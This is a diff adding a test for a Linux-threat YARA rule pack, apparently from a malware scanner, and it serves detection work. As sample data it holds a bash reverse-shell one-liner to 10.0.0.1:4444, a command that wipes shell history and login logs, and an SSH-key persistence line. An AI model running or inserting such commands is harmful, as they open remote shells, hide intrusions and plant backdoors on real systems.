@@ -88,3 +88,23 @@ def test_ransomware_pack_detects_and_no_fp():
         b"pool stratum+tcp://xmr.pool.example:3333 user wallet")
     # Benign prose must not match.
     assert hit(b"A guide to backups and file encryption best practices.") == set()
+
+
+def test_linux_threats_pack_detects_and_no_fp():
+    rules = yara.compile(
+        filepath=os.path.join(_RULES_DIR, "hawkscan_linux_threats.yar"))
+
+    def hit(data):
+        return {m.rule for m in rules.match(data=data)}
+
+    assert "HawkScan_Linux_Botnet_MiraiGafgyt" in hit(
+        b"\x7fELF junk TSource Engine Query more")
+    assert "HawkScan_Linux_ReverseShell" in hit(
+        b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
+    assert "HawkScan_Linux_AntiForensics_LogWipe" in hit(
+        b"unset HISTFILE; rm -f /var/log/wtmp /var/log/btmp")
+    assert "HawkScan_Linux_Persistence_Implant" in hit(
+        b"echo 'ssh-rsa AAAAB3Nz...' >> ~/.ssh/authorized_keys")
+    # Benign admin/firmware text must not match.
+    assert hit(b"This BusyBox firmware mounts /dev and starts the watchdog.") == set()
+    assert hit(b"Backup script: curl https://host/file and chmod +x it later.") == set()
